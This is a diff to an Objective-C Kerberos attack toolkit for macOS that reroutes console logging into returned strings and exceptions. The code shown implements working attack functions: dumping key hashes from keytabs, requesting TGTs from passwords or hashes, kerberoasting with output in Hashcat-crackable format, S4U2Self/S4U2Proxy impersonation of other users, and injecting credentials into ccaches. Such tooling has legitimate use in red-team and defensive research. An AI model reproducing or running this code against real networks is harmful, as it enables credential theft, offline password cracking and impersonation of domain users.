         if(strcmp(principal, targetPrincipal.UTF8String) == 0){
             if(enctype == entry.key.enctype){
                 hash = [[NSMutableString alloc] initWithString:@""];
-                printf("[*] Found match, retrieving key\n");
+                //printf("[*] Found match, retrieving key\n");
                 for(int i = 0; i < entry.key.length; i++){
                     [hash appendFormat:@"%02X", entry.key.contents[i]];
                 }
@@ -577,19 +645,19 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }
     ret = krb5_kt_end_seq_get(context, keytab, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
     ret = krb5_kt_close(context, keytab);
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_close");
     krb5_free_context(context);
     if(hash == NULL){
-        printf("[-] Failed to find principal and enc type in keytab\n");
+        @throw @"[-] Failed to find hash";
     }
     return hash;
 }
@@ -597,9 +665,10 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_context context;
     krb5_error_code ret;
     NSString *final_key = @"";
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return @"Error getting krb5 context";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     krb5_data data;
     data.data = password;
@@ -671,44 +740,54 @@ void printKrbError(krb5_context context, krb5_error_code ret){
 -(NSString*)getTGTUsername:(NSString*)usernameToUse Password:(NSString*)passwordToUse Domain:(NSString*)domainToUse{
     KLPrincipal principal;
     NSString* fullPrincipal = usernameToUse;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     fullPrincipal = [fullPrincipal stringByAppendingString:@"@"];
     fullPrincipal = [fullPrincipal stringByAppendingString:domainToUse];
-    printf("[*] Requesting principal: %s\n", fullPrincipal.UTF8String);
-    printf("[*] Requesting password: %s\n", passwordToUse.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting principal: %s\n", fullPrincipal.UTF8String]];
+    //printf("[*] Requesting principal: %s\n", fullPrincipal.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting password: %s\n", passwordToUse.UTF8String]];
+    //printf("[*] Requesting password: %s\n", passwordToUse.UTF8String);
     KLStatus status = KLCreatePrincipalFromString([fullPrincipal UTF8String], kerberosVersion_V5, &principal);
     if (status != klNoErr) {
         KLDisposePrincipal(principal);
-        printf("[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String);
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String]];
+        //printf("[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String);
+        @throw output;
     }else{
         char* displayPrincipal;
         KLGetDisplayStringFromPrincipal(principal, kerberosVersion_V5, &displayPrincipal);
-        printf("[*] Creating TGT Request for %s\n", displayPrincipal);
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating TGT Request for %s\n", displayPrincipal]];
+        //printf("[*] Creating TGT Request for %s\n", displayPrincipal);
     }
     krb5_context context;
     krb5_init_context (&context);
     krb5_ccache newCcache;
     char* credCacheName;
-    printf("[*] Requesting TGT into temporary CCache\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting TGT into temporary CCache\n"]];
+    //printf("[*] Requesting TGT into temporary CCache\n");
     status = KLAcquireNewInitialTicketsWithPassword(principal, NULL, [passwordToUse UTF8String], &credCacheName);
     if (status == klNoErr) {
         NSMutableString* fullCredCacheName = [[NSMutableString alloc] initWithUTF8String:"API:"];
         [fullCredCacheName appendString:[[NSString alloc] initWithUTF8String:credCacheName]];
-        printf("[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String);
-        printf("[*] Dumping ticket from new CCache and removing entry\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String]];
+        //printf("[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Dumping ticket from new CCache and removing entry\n"]];
+        //printf("[*] Dumping ticket from new CCache and removing entry\n");
         [self dumpCredentialsToKirbiCCache:fullCredCacheName.UTF8String Destroy:true];
         KLDisposePrincipal(principal);
     } else {
         KLDisposePrincipal(principal);
-        printf("%s\n", [self checkAcquireTicketsError:status].UTF8String);
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [self checkAcquireTicketsError:status].UTF8String]];
+        //printf("%s\n", [self checkAcquireTicketsError:status].UTF8String);
+        @throw output;
     }
-    return [[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.\n", usernameToUse];
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.\n", usernameToUse]];
+    return output;
 }
 -(NSString*)askTGTConnectDomain:(NSString*)connectDomain EncType:(int)enctype Hash:(NSString*)hash Username:(NSString*)username Domain:(NSString*)domain SupportAll:(bool)supportAll TgtEnctype:(int)tgtEnctype LKDCIP:(NSString*)lkdcip{
     //returns a base64 Kirbi version of the TGT
     kdc* kerbdc = [kdc alloc];
-    
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     NSData* test = createASREQ(enctype, hash, username, domain, supportAll, tgtEnctype, [NSMutableArray arrayWithObjects: [NSNumber numberWithInt:2], [NSNumber numberWithInt:149], nil], NULL);
     int result;
     if(lkdcip != NULL){
@@ -719,19 +798,22 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         result = [kerbdc connectDomain:domain.UTF8String];
     }
     if(result == -1){
-        return NULL;
+        @throw @"[-] Failed to connect to the domain";
     }
     result = [kerbdc sendBytes:test];
     if(result == -1){
-        return NULL;
+        @throw @"[-] Failed to send bytes";
     }else{
-        printf("[+] Successfully sent ASREQ\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent ASREQ\n"]];
+        //printf("[+] Successfully sent ASREQ\n");
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully received ASREP\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received ASREP\n"]];
+        //printf("[+] Successfully received ASREP\n");
     }
     NSData* asrep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length:holder.length];
     Krb5Ticket tgt;
@@ -742,23 +824,28 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         tgt = parseASREP(asrep, hash, enctype);
     }
     if(tgt.app29 != NULL){
-        printf("[*] Describing ticket\n");
-        printf("%s\n", describeTicket(tgt).UTF8String);
-        printf("[*] Creating Kirbi:\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
+        //printf("[*] Describing ticket\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(tgt).UTF8String]];
+        //printf("%s\n", describeTicket(tgt).UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
+        //printf("[*] Creating Kirbi:\n");
         NSData* kirbi = createKirbi(tgt);
-        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
-        return [kirbi base64EncodedStringWithOptions:0];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
+        //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
     }else{
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get TGT"]];
+        @throw output;
     }
+    return output;
 }
 -(NSString*)askTGSConnectDomain:(NSString*)connectDomainInput TGT:(NSString*)tgtKirbi Service:(NSString*)service ServiceDomain:(NSString*)serviceDomainInput Kerberoast:(bool)kerberoasting LKDCIP:(NSString*)LKDCIP{
     NSString* connectDomain = connectDomainInput;
     NSString* serviceDomain = serviceDomainInput;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
     if(TGT.app29 == NULL){
-        printf("[-] Failed to parse kirbi file\n");
-        return NULL;
+        @throw @"[-] Failed to parse kirbi file\n";
     }
     if(connectDomain == NULL){
         connectDomain = TGT.app1.realm.KerbGenStringvalue;
@@ -776,44 +863,55 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         result = [kerbdc connectLKDCByIP:LKDCIP.UTF8String];
     }
     if(result == -1){
-        return NULL;
+        @throw @"[-] Failed to connect to domain";
     }
-    printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String]];
+    //printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
     NSData* tgsreq = createTGSREQ(TGT, service, kerberoasting, serviceDomain);
     //printf("%s\n", [tgsreq base64EncodedStringWithOptions:0].UTF8String);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully sent TGSREQ\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent TGSREQ\n"]];
+        //printf("[+] Successfully sent TGSREQ\n");
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully received TGSREP\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received TGSREP\n"]];
+        //printf("[+] Successfully received TGSREP\n");
     }
     Krb5Ticket sTicket = parseTGSREP(holder, TGT, kerberoasting);
     if(sTicket.app29 != NULL){
         if( kerberoasting){
             //From Rubeus: string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
             NSString* octetvalues = sTicket.app1.encdata.getHexValue;
-            printf("[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String]];
+            //printf("[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String);
         }
-        printf("[*] Describing ticket\n");
-        printf("%s\n", describeTicket(sTicket).UTF8String);
-        printf("[*] Creating Kirbi:\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
+        //printf("[*] Describing ticket\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
+        //printf("%s\n", describeTicket(sTicket).UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
+        //printf("[*] Creating Kirbi:\n");
         NSData* kirbi = createKirbi(sTicket);
-        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
-        return [kirbi base64EncodedStringWithOptions:0];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
+        //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
+        return output;
     }else{
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket from response"]];
+        @throw output;
     }
 }
 -(NSString*)s4uTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser SPN:(NSString*)spn{
     NSString* connectDomain = connectDomainInput;
     NSString* spnDomain;
-    
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
     
     if( connectDomain == NULL ){
@@ -823,32 +921,36 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     kdc* kerbdc = [kdc alloc];
     int result = [kerbdc connectDomain:connectDomain.UTF8String];
     if(result == -1){
-        return NULL;
+        @throw @"[-] Failed to connect to KDC";
     }
-    printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
+    //printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
     NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully sent request\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully received response\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
     }
     Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
     if(sTicket.app29 != NULL){
         //we got a TGS back, now adjust it to be what we actually wanted
-        printf("[*] Describing ticket\n");
-        printf("%s\n", describeTicket(sTicket).UTF8String);
-        printf("[*] Creating Kirbi:\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
         NSData* kirbi = createKirbi(sTicket);
-        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
     }else{
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket"]];
+        @throw output;
     }
     //now that we have a forwardable service ticket, do the S4U2Proxy process to get the next service ticket
     [kerbdc closeConnection];
@@ -861,40 +963,44 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         spnDomain = sTicket.app29.realm29.KerbGenStringvalue;
     }
-    printf("[*] Impersonating %s to service %s@%s via S4U2Proxy\n", sTicket.app29.cname.username.KerbGenStringvalue.UTF8String, spn.UTF8String, spnDomain.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Impersonating %s to service %s@%s via S4U2Proxy\n", sTicket.app29.cname.username.KerbGenStringvalue.UTF8String, spn.UTF8String, spnDomain.UTF8String]];
     NSData* S4U2ProxyReq = createS4U2ProxyReq(TGT, spn, spnDomain, [sTicket.app1 collapseToNSData]);
     result = [kerbdc connectDomain:connectDomain.UTF8String];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        @throw output;
     }
     result = [kerbdc sendBytes:S4U2ProxyReq];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully sent request\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     holder = [kerbdc recvBytes];
     if(holder == NULL){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully received response\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
     }
     Krb5Ticket s4uTicket = parseTGSREP(holder, TGT, false);
     if(s4uTicket.app29 != NULL){
-        printf("[*] Describing ticket\n");
-        printf("%s\n", describeTicket(s4uTicket).UTF8String);
-        printf("[*] Creating Kirbi:\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(s4uTicket).UTF8String]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
         NSData* kirbi = createKirbi(s4uTicket);
-        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
-        return [kirbi base64EncodedStringWithOptions:0];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
     }else{
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
+        @throw output;
     }
+    return output;
 }
 -(NSString*)s4u2selfTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser{
     NSString* connectDomain = connectDomainInput;
     NSString* spnDomain;
-    
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
     
     if( connectDomain == NULL ){
@@ -904,41 +1010,48 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     kdc* kerbdc = [kdc alloc];
     int result = [kerbdc connectDomain:connectDomain.UTF8String];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        @throw output;
     }
-    printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
     NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
     result = [kerbdc sendBytes:tgsreq];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully sent request\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
     }
     NSData* holder = [kerbdc recvBytes];
     if(holder == NULL){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
+        @throw output;
     }else{
-        printf("[+] Successfully received response\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
     }
     Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
     if(sTicket.app29 != NULL){
         //we got a TGS back, now adjust it to be what we actually wanted
-        printf("[*] Describing ticket\n");
-        printf("%s\n", describeTicket(sTicket).UTF8String);
-        printf("[*] Creating Kirbi:\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
         NSData* kirbi = createKirbi(sTicket);
         [kerbdc closeConnection];
-        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
-        return [kirbi base64EncodedStringWithOptions:0];
+        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
+        
     }else{
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
+        @throw output;
     }
+    return output;
 }
 -(NSString*)askLKDCDomainByIP:(NSString*)IP{
     kdc* krbdc = [kdc alloc];
     int result = [krbdc connectLKDCByIP: IP.UTF8String];
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
+        @throw output;
     }
     // now to start the back-and-forth process with the LKDC at the end of the IP specified
     // Step 1: Application 10 AS-REQ with domain of WELLKNOWN:COM.APPLE.LKDC to get remote KDC Realm
@@ -946,28 +1059,29 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     //printf("Stage 1 Req: %s\n", [LKDC_Stage1_Req base64EncodedStringWithOptions:0].UTF8String);
     result = [krbdc sendBytes:LKDC_Stage1_Req];
     if(result == -1){
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
+        @throw output;
     }
     else{
-        printf("[+] Successfully sent request for remote LKDC realm\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request for remote LKDC realm\n"]];
     }
     NSData* holder = [krbdc recvBytes];
     if(holder == NULL){
-        printf("[-] Failed to get response from remote LKDC\n");
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get response from remote LKDC\n"]];
+        @throw output;
     }
     else{
-        printf("[+] Received response from LKDC\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Received response from LKDC\n"]];
     }
     NSData* LKDC_Stage1_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
     //printf("Stage 1 Rep: %s\n", [LKDC_Stage1_Rep base64EncodedStringWithOptions:0].UTF8String);
     NSString* remoteRealm = LKDC_Stage1_ParseASREPForRemoteRealm(LKDC_Stage1_Rep);
     if(remoteRealm != NULL){
-        printf("[+] Remote realm is: %s\n", remoteRealm.UTF8String);
+        //printf("[+] Remote realm is: %s\n", remoteRealm.UTF8String);
         return remoteRealm;
     }else{
-        printf("[-] Failed to get remote realm from KDC\n");
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get remote realm from KDC\n"]];
+        @throw output;
     }
 }
 -(bool)createLKDCCACHECONFDataPrincipal:(NSString*)principalName TicketData:(NSString*)ticketData CCacheName:(NSString*)cacheName{
@@ -975,16 +1089,16 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_context context;
     krb5_error_code ret;
     krb5_creds cred;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return false;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[*] Resolving ccache name %s\n", cacheName.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving ccache name %s\n", cacheName.UTF8String]];
     ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
     if(ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to get ccache\n");
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.addresses = NULL;
     cred.authdata = NULL;
@@ -1000,9 +1114,8 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_principal sname;
     ret = krb5_build_principal(context, &sname, 2, "X-CACHECONF:", "krb5_ccache_conf_data", principalName.UTF8String, nil);
     if (ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to build principal for ccache cred\n");
-        return false;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.server = sname;
     cred.magic = KV5M_CREDS;
@@ -1017,33 +1130,30 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_principal cname;
     ret = krb5_cc_get_principal (context, cache, &cname);
     if(ret){
-        printKrbError(context, ret);
-        return false;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.client = cname;
 
     //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
-    printf("[*] Saving credential for %s\n", principalName.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Saving credential for %s\n", principalName.UTF8String]];
     ret = krb5_cc_store_cred(context, cache, &cred);
     if(ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to store cred, trying to initialize first\n");
+        [output appendString:getKrbError(context, ret)];
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to store cred, trying to initialize first\n"]];
         //can't store cred to a new store without initializing it, so make sure to do that if storing fails
         ret = krb5_cc_initialize(context, cache, cred.client);
         if(ret){
-            printKrbError(context,ret);
-            printf("[-] Failed to initialize cache\n");
-            return NULL;
+            @throw output;
         }
-        printf("[+] Successfully initialized cache\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully initialized cache\n"]];
     }
     ret = krb5_cc_store_cred(context, cache, &cred);
     if(ret){
-        printKrbError(context, ret);
-        printf("[-] Failed to store credential\n");
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully imported credential\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully imported credential\n"]];
     return true;
 }
 -(bool)storeLKDCConfDataFriendlyName:(NSString*)friendlyName Hostname:(NSString*)hostname Password:(NSString*)password CCacheName:(NSString*)cacheName{
